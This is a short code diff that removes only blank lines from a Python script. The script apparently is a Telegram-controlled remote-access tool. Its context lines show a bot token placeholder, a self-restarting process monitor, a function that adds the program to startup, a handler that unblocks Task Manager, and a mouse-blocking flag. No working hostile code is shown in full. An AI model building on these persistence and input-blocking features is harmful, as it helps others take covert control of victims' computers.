@@ -44,7 +44,6 @@ keys = [
     'grave', 'backtick', 'tilde'
 ]
 
-
 bot_token = 'your bot token from -> @BotFather'
 bot = telebot.TeleBot(bot_token)
 
@@ -62,7 +61,6 @@ def monitor_process(parent_pid):
             python = sys.executable  
             os.execl(python, python, *sys.argv)  
         time.sleep(1)
-
 
 def add_to_startup_for_device():
     if getattr(sys, 'frozen', False):
@@ -289,7 +287,6 @@ def unblock_task_manager(message):
     
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
-
 
 mouse_block = True
 
